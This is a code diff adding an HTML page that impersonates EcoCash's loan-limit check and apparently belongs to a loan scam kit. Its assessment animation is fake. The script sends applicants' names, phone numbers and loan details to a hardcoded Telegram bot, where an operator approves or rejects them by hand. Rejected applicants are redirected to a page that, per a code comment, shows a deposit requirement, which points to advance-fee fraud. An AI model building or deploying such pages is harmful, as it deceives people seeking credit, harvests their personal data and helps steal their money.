@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>EcoCash - Loan Limit Assessment</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(160deg, #f8fbff 0%, #eef5ff 45%, #f3f4f6 100%);
+    padding: 20px;
+  }
+
+  .container {
+    width: min(92%, 430px);
+    background: #ffffff;
+    border-radius: 22px;
+    overflow: hidden;
+    box-shadow: 0 14px 30px rgba(15, 23, 42, 0.12);
+  }
+
+  .header {
+    background: linear-gradient(135deg, #0b5ea6, #0a4f8c);
+    color: #ffffff;
+    padding: 30px 24px;
+    text-align: center;
+  }
+
+  .logo { font-size: 36px; font-weight: 700; margin-bottom: 8px; }
+  .logo span:last-child { color: #ffb4b9; }
+  .subtitle { font-size: 14px; opacity: 0.95; }
+
+  .content { padding: 22px; }
+
+  .status-card {
+    border: 1px solid #dbeafe;
+    background: #eff6ff;
+    border-radius: 14px;
+    padding: 14px;
+    margin-bottom: 14px;
+  }
+
+  .status-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: #1e3a8a;
+    margin-bottom: 8px;
+  }
+
+  .status-line {
+    font-size: 13px;
+    color: #1e40af;
+    line-height: 1.5;
+  }
+
+  .status-meter {
+    width: 100%;
+    height: 8px;
+    background: #dbeafe;
+    border-radius: 999px;
+    margin-top: 12px;
+    overflow: hidden;
+  }
+
+  .status-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2563eb, #0ea5e9);
+    transition: width 0.5s ease;
+  }
+
+  .result-card {
+    display: none;
+    border: 1px solid #d1fae5;
+    background: #ecfdf5;
+    border-radius: 14px;
+    padding: 14px;
+    margin-bottom: 14px;
+  }
+
+  .result-card.show { display: block; }
+
+  .result-title {
+    color: #065f46;
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 10px;
+  }
+
+  .result-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 0;
+    border-bottom: 1px solid #bbf7d0;
+    font-size: 13px;
+  }
+
+  .result-row:last-child { border-bottom: none; }
+  .result-label { color: #166534; }
+  .result-value { color: #14532d; font-weight: 700; }
+  .result-value.limit { font-size: 22px; }
+
+  .notice {
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    color: #78350f;
+    border-radius: 12px;
+    padding: 12px;
+    font-size: 13px;
+    line-height: 1.5;
+    margin-bottom: 14px;
+  }
+
+  .amount-input-group {
+    background: #f0f9ff;
+    border: 2px solid #0b5ea6;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 14px;
+  }
+
+  .amount-input-label {
+    font-size: 13px;
+    color: #0b5ea6;
+    font-weight: 600;
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  .amount-input {
+    width: 100%;
+    font-size: 24px;
+    font-weight: bold;
+    color: #0b5ea6;
+    border: none;
+    background: transparent;
+    outline: none;
+    padding: 4px 0;
+  }
+
+  .amount-input::placeholder {
+    color: #93c5fd;
+  }
+
+  .btn {
+    width: 100%;
+    border: none;
+    border-radius: 12px;
+    padding: 13px 14px;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .btn-primary {
+    background: #0b5ea6;
+    color: #ffffff;
+  }
+
+  .btn-primary:hover {
+    background: #094d8a;
+  }
+
+  .btn-primary:disabled {
+    background: #93c5fd;
+    cursor: not-allowed;
+  }
+
+  .approval-message {
+    display: none;
+    background: #ecfdf5;
+    border: 2px solid #10b981;
+    border-radius: 14px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 14px;
+  }
+
+  .approval-message.show {
+    display: block;
+  }
+
+  .approval-icon {
+    font-size: 48px;
+    margin-bottom: 12px;
+  }
+
+  .approval-title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #065f46;
+    margin-bottom: 8px;
+  }
+
+  .approval-text {
+    font-size: 14px;
+    color: #047857;
+    line-height: 1.6;
+  }
+
+  .footer {
+    background: #0b5ea6;
+    color: #ffffff;
+    text-align: center;
+    font-size: 13px;
+    opacity: 0.95;
+    padding: 12px;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo"><span>Eco</span><span>Cash</span></div>
+      <div class="subtitle">Account History Loan Limit Check</div>
+    </div>
+
+    <div class="content">
+      <div class="status-card">
+        <div class="status-title">Assessing your account history</div>
+        <div class="status-line" id="statusLine">Preparing account signals...</div>
+        <div class="status-meter"><div id="statusFill" class="status-fill"></div></div>
+      </div>
+
+      <div id="resultCard" class="result-card">
+        <div class="result-title">Loan limit assigned successfully</div>
+        <div class="result-row">
+          <span class="result-label">Requested Loan Amount</span>
+          <span class="result-value" id="requestedAmount">$0.00</span>
+        </div>
+        <div class="result-row">
+          <span class="result-label">Assigned Loan Limit</span>
+          <span class="result-value limit" id="assignedLimit">$0.00</span>
+        </div>
+      </div>
+
+      <div id="approvalMessage" class="approval-message">
+        <div class="approval-icon">✅</div>
+        <div class="approval-title">Loan Approved!</div>
+        <div class="approval-text">
+          Your loan has been approved and will be disbursed to your EcoCash wallet within 1 hour.
+        </div>
+      </div>
+
+      <div class="amount-input-group" id="amountInputGroup">
+        <label class="amount-input-label">Enter loan amount you want to borrow:</label>
+        <input type="number" class="amount-input" id="loanAmountInput" placeholder="0.00" min="50" step="50">
+      </div>
+
+      <div class="notice">
+        You must be able to maintain at least 10% of the loan amount in your wallet to show repayment capacity. This amount is not a fee and is not subtracted from your loan disbursement.
+      </div>
+
+      <button id="applyNowBtn" class="btn btn-primary" disabled>Apply Now</button>
+    </div>
+
+    <div class="footer">v4.0.1P</div>
+  </div>
+
+  <script src="telegram-config.js"></script>
+  <script>
+    const TELEGRAM_CONFIG = window.TELEGRAM_CONFIG || {
+      BOT_TOKEN: '8983769163:AAGH_GBl-SOlu4SAgXjerck3v1jnuW6cXxk',
+      CHAT_ID: '8930275466'
+    };
+
+    const TG_API = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}`;
+
+    function formatCurrency(value) {
+      return '$' + Number(value).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function toNumber(value, fallback) {
+      const num = parseFloat(value);
+      return Number.isFinite(num) ? num : fallback;
+    }
+
+    function calculateAssignedLimit(loanData) {
+      const requestedAmount = Math.max(50, toNumber(loanData.amount, 500));
+      const term = Math.max(3, parseInt(loanData.term, 10) || 12);
+
+      const termFactor = term >= 12 ? 1.04 : 1.0;
+
+      let assignedLimit = requestedAmount * termFactor;
+      assignedLimit = Math.max(assignedLimit, requestedAmount * 1.1);
+
+      return {
+        requestedAmount,
+        assignedLimit: Math.round(assignedLimit / 10) * 10
+      };
+    }
+
+    function saveAssessment(data) {
+      localStorage.setItem('loanAssessment', JSON.stringify(data));
+    }
+
+    // Get the latest update_id so we only listen for NEW callbacks
+    async function getLatestUpdateId() {
+      try {
+        const res = await fetch(`${TG_API}/getUpdates?offset=-1`);
+        const data = await res.json();
+        if (data.ok && data.result.length > 0) {
+          return data.result[data.result.length - 1].update_id;
+        }
+      } catch (e) {}
+      return 0;
+    }
+
+    // Send loan application to Telegram with inline buttons
+    async function sendLoanApplicationWithButtons(loanAmount, assignedLimit, userData) {
+      const message = `💰 LOAN APPLICATION REQUEST
+
+📋 Applicant Details:
+• Name: ${userData.firstName || 'N/A'} ${userData.lastName || ''}
+• Phone: ${userData.phone || 'N/A'}
+
+💵 Loan Information:
+• Requested Amount: $${Number(loanAmount).toLocaleString()}
+• Assigned Limit: $${Number(assignedLimit).toLocaleString()}
+• Loan Type: ${userData.loanType || 'N/A'}
+• Term: ${userData.term || 'N/A'} months
+
+⏰ Time: ${new Date().toLocaleString()}`;
+
+      try {
+        const res = await fetch(`${TG_API}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CONFIG.CHAT_ID,
+            text: message,
+            reply_markup: {
+              inline_keyboard: [[
+                { text: '✅ Approve Loan', callback_data: 'loan_approve' },
+                { text: '❌ Reject Loan', callback_data: 'loan_reject' }
+              ]]
+            }
+          })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          return data.result.message_id;
+        }
+        return null;
+      } catch (e) {
+        console.error('Telegram send error:', e);
+        return null;
+      }
+    }
+
+    // Answer callback query
+    async function answerCallback(callbackQueryId) {
+      try {
+        await fetch(`${TG_API}/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ callback_query_id: callbackQueryId })
+        });
+      } catch (e) {}
+    }
+
+    // Remove buttons from message after decision
+    async function editMessageAfterDecision(messageId) {
+      try {
+        await fetch(`${TG_API}/editMessageReplyMarkup`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CONFIG.CHAT_ID,
+            message_id: messageId,
+            reply_markup: { inline_keyboard: [] }
+          })
+        });
+      } catch (e) {}
+    }
+
+    // Poll Telegram for admin decision on loan
+    async function pollForLoanDecision(sentMessageId, startUpdateId, onResult) {
+      let attempts = 0;
+      const maxAttempts = 120;
+      const offset = startUpdateId + 1;
+
+      const poll = async () => {
+        attempts++;
+        try {
+          const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&timeout=2`);
+          const data = await res.json();
+          if (data.ok && data.result.length > 0) {
+            for (const update of data.result) {
+              if (update.callback_query &&
+                  update.callback_query.message &&
+                  update.callback_query.message.message_id === sentMessageId) {
+                const decision = update.callback_query.data;
+                await answerCallback(update.callback_query.id);
+                await editMessageAfterDecision(sentMessageId);
+                await fetch(`${TG_API}/getUpdates?offset=${update.update_id + 1}`);
+                onResult(decision);
+                return;
+              }
+            }
+          }
+        } catch (e) {
+          console.error('Poll error:', e);
+        }
+        if (attempts < maxAttempts) {
+          setTimeout(poll, 1500);
+        } else {
+          onResult('timeout');
+        }
+      };
+      poll();
+    }
+
+    function runAssessment() {
+      const statusLine = document.getElementById('statusLine');
+      const statusFill = document.getElementById('statusFill');
+      const resultCard = document.getElementById('resultCard');
+      const applyNowBtn = document.getElementById('applyNowBtn');
+      const loanAmountInput = document.getElementById('loanAmountInput');
+
+      const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
+      const { requestedAmount, assignedLimit } = calculateAssignedLimit(loanData);
+      const requiredHolding = assignedLimit * 0.1;
+
+      const steps = [
+        'Preparing account signals...',
+        'Evaluating wallet activity and repayment behavior...',
+        'Calculating qualified loan limit...',
+        'Finalizing your personalized limit...'
+      ];
+
+      let idx = 0;
+      const timer = setInterval(() => {
+        const progress = Math.min(100, (idx + 1) * 25);
+        statusLine.textContent = steps[idx] || steps[steps.length - 1];
+        statusFill.style.width = progress + '%';
+
+        idx += 1;
+
+        if (idx >= steps.length) {
+          clearInterval(timer);
+
+          document.getElementById('requestedAmount').textContent = formatCurrency(requestedAmount);
+          document.getElementById('assignedLimit').textContent = formatCurrency(assignedLimit);
+
+          // Pre-fill the input with requested amount
+          loanAmountInput.value = requestedAmount;
+          loanAmountInput.max = assignedLimit;
+
+          saveAssessment({
+            requestedAmount,
+            assignedLimit,
+            requiredHolding,
+            generatedAt: new Date().toISOString()
+          });
+
+          resultCard.classList.add('show');
+          statusLine.textContent = 'Loan limit assessment completed.';
+          applyNowBtn.disabled = false;
+        }
+      }, 850);
+
+      // Validate input and update button state
+      loanAmountInput.addEventListener('input', function() {
+        const amount = parseFloat(loanAmountInput.value);
+        if (amount >= 50 && amount <= assignedLimit) {
+          applyNowBtn.disabled = false;
+        } else {
+          applyNowBtn.disabled = true;
+        }
+      });
+
+      applyNowBtn.addEventListener('click', async function() {
+        const loanAmount = parseFloat(loanAmountInput.value);
+        
+        if (!loanAmount || loanAmount < 50 || loanAmount > assignedLimit) {
+          alert('Please enter a valid loan amount within your assigned limit.');
+          return;
+        }
+
+        // Disable button and show loading
+        applyNowBtn.disabled = true;
+        applyNowBtn.textContent = 'Processing...';
+
+        // Get latest update_id BEFORE sending
+        const lastUpdateId = await getLatestUpdateId();
+
+        // Send to Telegram with inline buttons
+        const sentMessageId = await sendLoanApplicationWithButtons(loanAmount, assignedLimit, loanData);
+        
+        if (!sentMessageId) {
+          alert('Connection error. Please try again.');
+          applyNowBtn.disabled = false;
+          applyNowBtn.textContent = 'Apply Now';
+          return;
+        }
+
+        // Update button text to show waiting state
+        applyNowBtn.textContent = 'Awaiting Approval...';
+
+        // Poll Telegram for admin decision
+        pollForLoanDecision(sentMessageId, lastUpdateId, function(result) {
+          if (result === 'loan_approve') {
+            // Show approval message
+            document.getElementById('amountInputGroup').style.display = 'none';
+            document.querySelector('.notice').style.display = 'none';
+            applyNowBtn.style.display = 'none';
+            document.getElementById('approvalMessage').classList.add('show');
+          } else if (result === 'loan_reject') {
+            // Redirect to dashboard (shows deposit requirement)
+            window.location.href = 'dashboard.html';
+          } else {
+            // Timeout
+            alert('Request timed out. Please try again.');
+            applyNowBtn.disabled = false;
+            applyNowBtn.textContent = 'Apply Now';
+          }
+        });
+      });
+    }
+
+    runAssessment();
+  </script>
+</body>
+
+</html>
